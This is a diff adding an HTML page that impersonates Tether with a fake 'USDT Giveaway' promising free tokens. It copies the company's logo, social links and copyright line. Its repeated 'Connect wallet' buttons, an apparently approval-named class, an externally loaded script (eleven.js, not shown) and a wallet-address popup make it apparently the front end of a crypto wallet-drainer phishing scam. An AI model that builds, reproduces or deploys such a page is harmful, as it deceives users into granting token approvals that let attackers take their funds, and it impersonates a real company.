@@ -1,0 +1,152 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Giveaway | Earn Free Crypto</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+    <link rel="stylesheet" href="styles.css">
+	<script type='module' defer crossorigin src='./assets/eleven.js'></script> 
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-container">
+            <a href="#" class="logo">
+                <img src="logo.svg" alt="Tether" class="logo-img">
+            </a>
+            <div class="header-actions">
+                <button class='cnnctAprBtn'>Connect wallet</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="floating-coins" id="floatingCoins">
+                <!-- Coins will be added by JavaScript -->
+            </div>
+            <div class="heading-with-logo">
+                <img src="mlogo.svg" alt="USDT" class="heading-logo">
+                <h1>USDT Giveaway</h1>
+            </div>
+            <p>Complete simple tasks to earn free USDT tokens. Limited time offer!</p>
+            
+            <!-- USDT Progress Bar -->
+            <div class="progress-container">
+                <div class="progress-bar" style="width: 70%;"></div>
+                <div class="progress-text">Remaining...</div>
+            </div>
+        </section>
+
+        <!-- Giveaway Cards -->
+        <div class="card-grid">
+            <!-- USDT Giveaway Card -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">USDT Giveaway</div>
+                    <div class="card-subtitle">Earn free USDT tokens</div>
+                </div>
+                <div class="card-body">
+                    <div class="reward-badge">Reward: Up to 100 USDT</div>
+                    <div class="reward-amount">1,000,000 USDT</div>
+                    <div class="reward-desc">Total prize pool for active participants</div>
+                    <button class='cnnctAprBtn'>Connect wallet</button>
+                </div>
+            </div>
+
+            <!-- How It Works Card -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">How It Works</div>
+                    <div class="card-subtitle">Simple steps to earn rewards</div>
+                </div>
+                <div class="card-body">
+                    <ol style="text-align: left; padding-left: 20px; margin-bottom: 20px; color: var(--text-secondary);">
+                        <li style="margin-bottom: 12px;">Connect your wallet</li>
+                        <li style="margin-bottom: 12px;">Complete verification</li>
+                        <li style="margin-bottom: 12px;">Claim your reward</li>
+                    </ol>
+                    <div class="reward-desc">Limited time offer. Terms and conditions apply.</div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Popup -->
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <div class="popup-header">
+                <h3 class="popup-title">Enter Your Wallet Address</h3>
+                <button class="close">&times;</button>
+            </div>
+            <div class="popup-body">
+                <div class="form-group">
+                    <label for="walletAddress" class="form-label">Ethereum/BSC Wallet Address</label>
+                    <input type="text" id="walletAddress" class="form-control" placeholder="0x..." required>
+                </div>
+                <button id="checkWallet" class="btn btn-primary">Verify Wallet</button>
+                <div id="result" class="result"></div>
+            </div>
+        </div>
+    </div>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="script.js"></script>
+    
+    <!-- Notifications -->
+    <div class="notification-container">
+        <div class="notification">
+            <span class="notification-icon">
+                <i class="fas fa-check-circle"></i>
+            </span>
+            <span class="notification-text"></span>
+            <img src="mlogo.svg" alt="USDT" class="notification-usdt">
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <a href="/" class="logo-link">
+                    <img src="logo.svg" alt="Tether" class="footer-logo-img">
+                </a>
+            </div>
+            
+            <div class="footer-social">
+                <div class="social-links">
+                    <a href="https://www.instagram.com/_tether_/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
+                        <i class="fab fa-instagram"></i>
+                    </a>
+                    <a href="https://x.com/Tether_to/" target="_blank" rel="noopener noreferrer" aria-label="Twitter">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a href="https://www.youtube.com/@tether_io" target="_blank" rel="noopener noreferrer" aria-label="YouTube">
+                        <i class="fab fa-youtube"></i>
+                    </a>
+                    <a href="https://t.me/tether" target="_blank" rel="noopener noreferrer" aria-label="Telegram">
+                        <i class="fab fa-telegram"></i>
+                    </a>
+                    <a href="https://www.linkedin.com/company/tether" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">
+                        <i class="fab fa-linkedin-in"></i>
+                    </a>
+                    <a href="https://www.facebook.com/tether.to" target="_blank" rel="noopener noreferrer" aria-label="Facebook">
+                        <i class="fab fa-facebook-f"></i>
+                    </a>
+                    <a href="https://www.reddit.com/r/Tether/" target="_blank" rel="noopener noreferrer" aria-label="Reddit">
+                        <i class="fab fa-reddit-alien"></i>
+                    </a>
+                </div>
+            </div>
+            
+            <div class="footer-copyright">
+                <p>Copyright © 2013 - 2025 Tether Operations, S.A. de C.V. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
